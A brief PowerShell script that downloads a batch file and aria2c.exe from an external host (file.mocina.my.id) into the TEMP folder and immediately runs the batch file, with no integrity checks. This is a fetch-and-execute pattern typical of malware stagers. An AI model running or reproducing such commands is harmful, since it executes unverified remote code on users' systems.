$batUrl    = 'https://file.mocina.my.id/uploads/installer.bat'
$batFile   = "$env:TEMP\installer.bat"

$aria2Url  = 'https://file.mocina.my.id/uploads/aria2c.exe'
$aria2File = "$env:TEMP\aria2c.exe"

Invoke-WebRequest -Uri $batUrl -OutFile $batFile
Invoke-WebRequest -Uri $aria2Url -OutFile $aria2File

cmd /c $batFile
